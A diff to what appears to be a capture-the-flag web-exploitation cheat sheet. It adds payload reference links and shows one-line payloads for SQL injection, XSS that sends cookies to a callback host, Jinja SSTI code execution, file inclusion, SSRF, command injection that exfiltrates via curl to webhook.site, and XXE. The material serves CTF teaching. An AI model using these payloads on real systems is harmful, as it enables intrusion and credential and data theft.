@@ -63,6 +63,8 @@ Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortS
 
 **Example:** `' UNION SELECT 1,group_concat(user,0x3a,pass),3 FROM users-- -` → `admin:H4G{sqli_classic}`.
 
+**Payloads:** [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection), [PortSwigger SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+
 **Gotchas:** comment style (`-- -`, `#`, `/**/`); filtered spaces → `/**/` or `%09`; numeric context needs no quote.
 
 ### XSS
@@ -80,6 +82,8 @@ Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortS
 
 **Example:** comment field stores `<img src=x onerror=fetch('//ID?c='+document.cookie)>`; admin views it → cookie = `H4G{stored_xss}`.
 
+**Payloads:** [PayloadsAllTheThings: XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection), [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
+
 **Gotchas:** HTML vs attribute vs JS context changes the payload. [webhook.site](https://webhook.site/) to catch callbacks. [CSP bypass](../.agents/skills/ctf-web/client-side-advanced.md) if blocked.
 
 ### SSTI
@@ -95,6 +99,8 @@ Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortS
 3. RCE gadget: `{{cycler.__init__.__globals__.os.popen('id').read()}}`.
 
 **Example:** `name={{config}}` dumps app config incl. `FLAG='H4G{ssti_jinja}'`.
+
+**Payloads:** [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection).
 
 **Gotchas:** `49` as text (not `{{7*7}}`) confirms it. Sandbox escapes vary by engine; see [server-side.md](../.agents/skills/ctf-web/server-side.md).
 
@@ -113,6 +119,8 @@ Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortS
 
 **Example:** `?page=php://filter/convert.base64-encode/resource=config` → decode → `H4G{lfi_source_leak}`.
 
+**Payloads:** [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
+
 **Gotchas:** app may append `.php`; the `php://filter` trick sidesteps it. Depth: pad with extra `../`.
 
 ### SSRF
@@ -129,6 +137,8 @@ Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortS
 4. Filter bypass: alt IP encodings, redirects, `http://127.0.0.1.nip.io`.
 
 **Example:** `?url=http://127.0.0.1:8080/admin` returns the internal admin page with `H4G{ssrf_internal}`.
+
+**Payloads:** [PayloadsAllTheThings: SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery).
 
 **Gotchas:** blind SSRF → confirm via [webhook.site](https://webhook.site/). More in [server-side.md](../.agents/skills/ctf-web/server-side.md).
 
@@ -161,6 +171,8 @@ Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortS
 3. Blind → exfil: `; curl https://webhook.site/ID/$(id\|base64)` or time delay `; sleep 5`.
 
 **Example:** `host=127.0.0.1; cat /flag` → `H4G{cmd_injection}`.
+
+**Payloads:** [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).
 
 **Gotchas:** spaces filtered → `${IFS}`. More in [server-side-2.md](../.agents/skills/ctf-web/server-side-2.md).
 
@@ -210,6 +222,8 @@ Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortS
 2. No output → OOB: entity points at your webhook to exfil.
 
 **Example:** `file:///flag` entity echoed back → `H4G{xxe_file_read}`.
+
+**Payloads:** [PayloadsAllTheThings: XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection).
 
 **Gotchas:** PHP `php://filter` inside the entity to read source. More in [server-side-2.md](../.agents/skills/ctf-web/server-side-2.md).
 
